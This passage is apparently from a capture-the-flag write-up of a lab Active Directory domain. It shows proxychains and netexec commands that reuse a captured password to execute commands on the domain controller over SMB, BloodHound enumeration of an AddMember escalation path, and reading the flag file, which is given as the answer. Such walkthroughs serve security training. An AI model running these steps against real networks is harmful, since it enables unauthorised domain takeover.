LDAP        TARGET_IP_DC  389    DEADDROP-DC      [+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3389-<><>-OK
|DNS-request| deaddrop.loc 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: deaddrop.loc does not exist
RDP         TARGET_IP_DC  3389   DEADDROP-DC      [*] Windows 10 or Windows Server 2016 Build 17763 (name:DEADDROP-DC) (domain:deaddrop.loc) (nla:True)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3389-<><>-OK
RDP         TARGET_IP_DC  3389   DEADDROP-DC      [+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
|DNS-request| deaddrop.loc 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: deaddrop.loc does not exist
SMB         TARGET_IP_DC  445    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
SMB         TARGET_IP_DC  445    DEADDROP-DC      [+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
```

Use the `SMB` access to execute commands with administrator privileges to discover more information about `j.harris`.

```bash
root@ip-ATTACKER_IP:~# proxychains nxc smb TARGET_IP_DC -u 'j.harris' -p 'DropsOfJupiter2026!' -x 'whoami /all'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
|DNS-request| deaddrop.loc 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: deaddrop.loc does not exist
SMB         TARGET_IP_DC  445    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
SMB         TARGET_IP_DC  445    DEADDROP-DC      [+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:54110-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:54110-<><>-OK
SMB         TARGET_IP_DC  445    DEADDROP-DC      [+] Executed command via wmiexec
SMB         TARGET_IP_DC  445    DEADDROP-DC      USER INFORMATION
SMB         TARGET_IP_DC  445    DEADDROP-DC      ----------------
SMB         TARGET_IP_DC  445    DEADDROP-DC      User Name         SID
SMB         TARGET_IP_DC  445    DEADDROP-DC      ================= ============================================
SMB         TARGET_IP_DC  445    DEADDROP-DC      deaddrop\j.harris S-1-5-21-2304234032-2319324522-87291130-1103
SMB         TARGET_IP_DC  445    DEADDROP-DC      GROUP INFORMATION
SMB         TARGET_IP_DC  445    DEADDROP-DC      -----------------
SMB         TARGET_IP_DC  445    DEADDROP-DC      Group Name                                      Type             SID                                          Attributes
SMB         TARGET_IP_DC  445    DEADDROP-DC      =============================================== ================ ============================================ ===============================================================
SMB         TARGET_IP_DC  445    DEADDROP-DC      Everyone                                        Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      BUILTIN\Administrators                          Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
SMB         TARGET_IP_DC  445    DEADDROP-DC      BUILTIN\Users                                   Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      NT AUTHORITY\NETWORK                            Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      DEADDROP\Domain Admins                          Group            S-1-5-21-2304234032-2319324522-87291130-512  Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      DEADDROP\ITSupport-Admins                       Group            S-1-5-21-2304234032-2319324522-87291130-1104 Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      DEADDROP\Denied RODC Password Replication Group Alias            S-1-5-21-2304234032-2319324522-87291130-572  Mandatory group, Enabled by default, Enabled group, Local Group
SMB         TARGET_IP_DC  445    DEADDROP-DC      NT AUTHORITY\NTLM Authentication                Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
SMB         TARGET_IP_DC  445    DEADDROP-DC      Mandatory Label\High Mandatory Level            Label            S-1-16-12288
SMB         TARGET_IP_DC  445    DEADDROP-DC      PRIVILEGES INFORMATION
SMB         TARGET_IP_DC  445    DEADDROP-DC      ----------------------
SMB         TARGET_IP_DC  445    DEADDROP-DC      Privilege Name                            Description                                                        State
SMB         TARGET_IP_DC  445    DEADDROP-DC      ========================================= ================================================================== =======
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeSystemtimePrivilege                     Change the system time                                             Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeBackupPrivilege                         Back up files and directories                                      Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeRestorePrivilege                        Restore files and directories                                      Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeShutdownPrivilege                       Shut down the system                                               Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeDebugPrivilege                          Debug programs                                                     Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeUndockPrivilege                         Remove computer from docking station                               Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeTimeZonePrivilege                       Change the time zone                                               Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
SMB         TARGET_IP_DC  445    DEADDROP-DC      USER CLAIMS INFORMATION
SMB         TARGET_IP_DC  445    DEADDROP-DC      -----------------------
SMB         TARGET_IP_DC  445    DEADDROP-DC      User claims unknown.
SMB         TARGET_IP_DC  445    DEADDROP-DC      Kerberos support for Dynamic Access Control on this device has been disabled.
```

The `DEADDROP\ITSupport-Admins` group appears interesting, investigate it. Use `BloodHound` to discover additional information and relationships for `j.harris` (with respect to this group).

```bash
root@ip-ATTACKER_IP:~# proxychains bloodhound-python -ns TARGET_IP_DC -d deaddrop.loc -dc DEADDROP-DC.deaddrop.loc -u 'j.harris' -p 'DropsOfJupiter2026!' -c All --zip --dns-tcp
ProxyChains-3.1 (http://proxychains.sf.net)
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:53-<><>-OK
INFO: Found AD domain: deaddrop.loc
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:53-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:53-<><>-OK
INFO: Getting TGT for user
|DNS-request| DEADDROP-DC.deaddrop.loc 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: DEADDROP-DC.deaddrop.loc does not exist
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (DEADDROP-DC.deaddrop.loc:88)] [Errno 1] Unknown error
INFO: Connecting to LDAP server: DEADDROP-DC.deaddrop.loc
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:53-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:53-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: DEADDROP-DC.deaddrop.loc
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 22 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DEADDROP-WRK.deaddrop.loc
INFO: Querying computer: DEADDROP-DC.deaddrop.loc
|S-chain|-<>-127.0.0.1:9050-|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-TARGET_IP_DC:53-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.11.51:445-<--timeout
INFO: Done in 00M 23S
INFO: Compressing output into bloodhound.zip
```

Analysis of the data in `BloodHound` reveals that `j.harris` possesses an **AddMember** edge against `ITSupport-Admins`. This grants `j.harris` the ability to add other users to the group, presenting an opportunity for privilege escalation.

### What is the name of the group you target to escalate to Domain Admin?

From the previous question, the group is **ITSupport-Admins**.

### What is the flag on the Domain Controller?

Use the same `SMB` method to discover and capture the flag.

```bash
root@ip-ATTACKER_IP:~# proxychains nxc smb TARGET_IP_DC -u 'j.harris' -p 'DropsOfJupiter2026!' -x 'dir C:\Users\Administrator\Desktop'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
|DNS-request| deaddrop.loc 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: deaddrop.loc does not exist
SMB         TARGET_IP_DC  445    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
SMB         TARGET_IP_DC  445    DEADDROP-DC      [+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:54110-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:54110-<><>-OK
SMB         TARGET_IP_DC  445    DEADDROP-DC      [+] Executed command via wmiexec
SMB         TARGET_IP_DC  445    DEADDROP-DC       Volume in drive C has no label.
SMB         TARGET_IP_DC  445    DEADDROP-DC       Volume Serial Number is A8A4-C362
SMB         TARGET_IP_DC  445    DEADDROP-DC       Directory of C:\Users\Administrator\Desktop
SMB         TARGET_IP_DC  445    DEADDROP-DC      05/11/2026  06:10 AM    <DIR>          .
SMB         TARGET_IP_DC  445    DEADDROP-DC      05/11/2026  06:10 AM    <DIR>          ..
SMB         TARGET_IP_DC  445    DEADDROP-DC      06/21/2016  03:36 PM               527 EC2 Feedback.website
SMB         TARGET_IP_DC  445    DEADDROP-DC      06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
SMB         TARGET_IP_DC  445    DEADDROP-DC      05/19/2026  08:37 PM                29 flag.txt
SMB         TARGET_IP_DC  445    DEADDROP-DC                     3 File(s)          1,110 bytes
SMB         TARGET_IP_DC  445    DEADDROP-DC                     2 Dir(s)  14,315,220,992 bytes free
root@ip-ATTACKER_IP:~# proxychains nxc smb TARGET_IP_DC -u 'j.harris' -p 'DropsOfJupiter2026!' -x 'type C:\Users\Administrator\Desktop\flag.txt'
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
|DNS-request| deaddrop.loc 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: deaddrop.loc does not exist
SMB         TARGET_IP_DC  445    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
SMB         TARGET_IP_DC  445    DEADDROP-DC      [+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:54110-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:54110-<><>-OK
SMB         TARGET_IP_DC  445    DEADDROP-DC      [+] Executed command via wmiexec
SMB         TARGET_IP_DC  445    DEADDROP-DC      THM{d34d_dr0p_d0m41n_pwn3d}
```

The captured flag is **THM{d34d_dr0p_d0m41n_pwn3d}**.